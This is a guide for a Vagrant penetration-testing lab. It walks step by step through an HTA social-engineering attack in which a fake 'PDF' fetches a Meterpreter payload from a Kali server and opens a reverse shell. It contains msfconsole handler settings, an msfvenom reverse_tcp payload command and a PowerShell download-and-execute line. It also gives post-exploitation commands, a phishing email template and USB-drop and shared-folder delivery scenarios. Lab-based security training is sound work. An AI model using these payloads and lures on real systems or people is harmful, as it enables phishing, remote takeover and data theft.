# How to Use the Lab

**HTA Exploit - Social Engineering Attack Guide**

---

## Quick Start (Recommended)

The HTA exploit files are **already generated** after setup!

### Step 1: Start the attack on Kali

```bash
cd vagrant
vagrant ssh kali
cd /vagrant/exploits/hta
./start_hta_attack.sh
```

This automatically:
- Checks HTTP server (already running on port 8080)
- Starts Metasploit handler on port 4444
- Displays delivery instructions

**Note:** HTTP server starts automatically when Kali boots!

### Step 2: Deliver the fake PDF to Windows

**Method A: Desktop Shortcut (Easiest)** ⭐ **RECOMMENDED**
1. In Windows VM, look at the desktop
2. Double-click: `Download_Exploit_from_Kali`
3. This downloads the HTA file from Kali HTTP server automatically
4. When download completes, double-click `Q4_Financial_Report.pdf`

**Method B: Manual Placement**
1. In Windows VM, navigate to: `C:\vagrant\exploits\hta\`
2. Copy `Q4_Financial_Report_EXE.pdf.hta` to Desktop
3. Double-click the "PDF" file

**Method C: HTTP Download (Most Realistic)**
1. In Windows VM, open browser
2. Go to: `http://192.168.56.101:8080/`
3. Download `Q4_Financial_Report_EXE.pdf.hta`
4. Save to Desktop and double-click

### Step 3: Get Meterpreter Session!

You should see:
```
[*] Sending stage (175686 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:XXXXX)

meterpreter >
```

**That's it!** Three simple steps.

---

## Understanding the Attack

### What the Victim Sees

```
Desktop
  Q4_Financial_Report.pdf
  (Adobe PDF icon, red)
```

- **Filename**: Looks like a PDF document
- **Icon**: Adobe Reader PDF icon (red)
- **Extension**: Hidden by default (.lnk not shown)

### What Actually Happens

```
1. Victim double-clicks "PDF"
2. Windows executes the HTA file via mshta.exe
3. VBScript downloads: http://192.168.56.101:8080/update.exe
4. VBScript executes the downloaded EXE
5. Meterpreter EXE connects back to Kali:4444
6. Attacker gets remote access
```

**Key Techniques:**
- Social engineering (fake PDF icon)
- Silent execution (hidden windows)
- Executable payload (reliable on all Windows versions)
- Auto-execute on download

---

## Available Scripts

### HTA Exploit Scripts

| Script | Location | Purpose |
|--------|----------|---------|
| `start_hta_attack.sh` | `/vagrant/exploits/hta/` | Main attack automation |
| `update.exe` | `/vagrant/exploits/hta/` | Meterpreter EXE payload |
| `Q4_Financial_Report_EXE.pdf.hta` | `/vagrant/exploits/hta/` | Malicious HTA file |

### Attack Automation

**start_hta_attack.sh does:**
1. Pre-flight checks (files exist, ports available, connectivity)
2. Starts Python HTTP server (port 8080)
3. Creates Metasploit resource script
4. Starts Meterpreter handler (port 4444)
5. Displays delivery instructions
6. Waits for victim to execute

---

## Post-Exploitation Commands

### Basic Information

```bash
# System info
meterpreter > sysinfo

# Current user
meterpreter > getuid

# Process info
meterpreter > getpid
meterpreter > ps
```

### Screenshot

```bash
meterpreter > screenshot
```

### File Operations

```bash
# List files
meterpreter > ls

# Change directory
meterpreter > cd C:\\Users\\vagrant\\Desktop

# Download file
meterpreter > download file.txt

# Upload file
meterpreter > upload /path/to/file.txt C:\\Users\\vagrant\\Desktop\\
```

### Windows Command Shell

```bash
# Get Windows shell
meterpreter > shell

# Run commands
C:\> whoami
C:\> ipconfig
C:\> dir

# Exit shell (return to Meterpreter)
C:\> exit
```

### Creating Proof of Exploitation

```bash
# Get shell
meterpreter > shell

# Navigate to Desktop
C:\> cd C:\Users\vagrant\Desktop

# Create proof file
C:\> echo HACKED_VIA_HTA > HACKED_BY_YourName.txt
C:\> echo Attack: Malicious HTA File >> HACKED_BY_YourName.txt
C:\> echo Date: %DATE% %TIME% >> HACKED_BY_YourName.txt

# Exit shell
C:\> exit

# Download proof
meterpreter > download C:\\Users\\vagrant\\Desktop\\HACKED_BY_YourName.txt
```

---

## Advanced Usage

### Manual Metasploit Configuration

If you want to run Metasploit manually:

```bash
# Start Metasploit
msfconsole -q

# Configure handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ExitOnSession false
exploit -j

# Start HTTP server in another terminal
cd /home/vagrant/hta_payloads
python3 -m http.server 8080 --bind 192.168.56.101
```

### Regenerate HTA Exploit

If you need to regenerate the exploit files:

```bash
# SSH into Kali
vagrant ssh kali

# Run provisioning script
cd /vagrant/vagrant/provisioning/kali
./create_hta_exploit.sh
```

### Custom Payload

Generate custom EXE payload:

```bash
# On Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -a x64 \
    --platform windows \
    -f exe \
    -o /vagrant/exploits/hta/custom_payload.exe
```

---

## Delivery Method Scenarios

### Scenario 1: Phishing Email

**Setup:**
1. Start attack script on Kali
2. Host HTA file on HTTP server
3. Craft phishing email

**Email Template:**
```
Subject: Q4 Financial Results - URGENT

Dear Team,

Please review the attached Q4 financial report before
tomorrow's board meeting.

Download: http://192.168.56.101:8080/Q4_Financial_Report_EXE.pdf.hta

Best regards,
CFO
```

**Victim Actions:**
1. Opens email
2. Clicks download link
3. Saves file to Desktop
4. Double-clicks to "open PDF"
5. Gets exploited

### Scenario 2: USB Drop Attack

**Setup:**
1. Copy HTA file to USB drive
2. Label USB: "Executive Salaries 2024"
3. Leave in company parking lot

**Victim Actions:**
1. Finds USB drive
2. Plugs into computer
3. Opens USB to see contents
4. Double-clicks "Executive_Salaries_2024.pdf.hta"
5. Gets exploited

### Scenario 3: Shared Network Folder

**Setup:**
1. Place HTA file in shared network folder
2. Name: "Company_Policy_Update.pdf.hta"

**Victim Actions:**
1. Browses shared folder
2. Sees new policy document
3. Double-clicks to open
4. Gets exploited

---

## Troubleshooting

### HTA File Doesn't Execute

**Check:**
1. Verify Windows can reach Kali:
   ```powershell
   Test-Connection 192.168.56.101
   ```

2. Test HTTP server:
   ```powershell
   Invoke-WebRequest http://192.168.56.101:8080/update.exe
   ```

3. Test download manually:
   ```powershell
   (New-Object Net.WebClient).DownloadFile('http://192.168.56.101:8080/update.exe', 'C:\temp\update.exe')
   Start-Process C:\temp\update.exe
   ```

### No Meterpreter Session

**Check:**
1. Verify Metasploit listener is running:
   ```bash
   # In msfconsole
   jobs
   ```

2. Check HTTP server logs:
   ```bash
   cat /tmp/http_server.log
   ```

3. Verify Windows firewall is disabled:
   ```powershell
   Get-NetFirewallProfile | Select Name, Enabled
   ```

### HTTP Server Not Reachable

**Check:**
1. Verify server is running:
   ```bash
   ss -tuln | grep 8080
   ```

2. Test from Kali:
   ```bash
   curl http://192.168.56.101:8080/shell.ps1
   ```

3. Check network connectivity:
   ```bash
   ping 192.168.56.102
   ```

---

## Lab Management

### Reset Lab to Clean State

```bash
./reset.sh
```

This restores both VMs to clean snapshots in ~30 seconds.

### Stop VMs

```bash
cd vagrant
vagrant halt
```

### Start VMs

```bash
cd vagrant
vagrant up
```

### Check VM Status

```bash
cd vagrant
vagrant status
```

### Complete Cleanup

```bash
./cleanup.sh
```

Removes all VMs and frees disk space.

---

## Best Practices

### For Learning

1. **Understand before executing** - Read exploits/hta/README.md first
2. **Try different delivery methods** - Practice all scenarios
3. **Document your findings** - Take notes, screenshots
4. **Practice defenses** - Learn how to detect and prevent
5. **Reset between attempts** - Use `./reset.sh` for clean state

### For Teaching

1. **Demonstrate deception** - Show PDF icon vs actual HTA file
2. **Explain social engineering** - Why victims fall for it
3. **Show network traffic** - Wireshark capture of payload download
4. **Teach defenses** - File extension visibility, HTA application blocking
5. **Discuss ethics** - Real-world implications

### For Security Awareness

1. **Show file extensions** - Windows hides .hta extension
2. **Verify sources** - Don't trust unexpected files
3. **Question urgency** - "URGENT" emails are often phishing
4. **Check URLs** - Hover before clicking links
5. **Report suspicious files** - Contact IT immediately

---

## Next Steps

1. **Master the basics** - Run automated attack successfully
2. **Try manual mode** - Configure Metasploit yourself
3. **Practice delivery** - Test different social engineering scenarios
4. **Learn defenses** - Configure PowerShell logging, AppLocker
5. **Document findings** - Create professional penetration test report

---

## Additional Resources

**Documentation:**
- [exploits/hta/README.md](exploits/hta/README.md) - Complete technical details
- [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Common issues
- [README.md](README.md) - Main lab documentation

**External Resources:**
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
- [HTA Attack Techniques](https://attack.mitre.org/techniques/T1218/005/)

---

**Ready to practice? Start with the Quick Start guide above!**

---

*Last Updated: 2026-01-10*
*Version: 2.0 - HTA Exploit Lab*
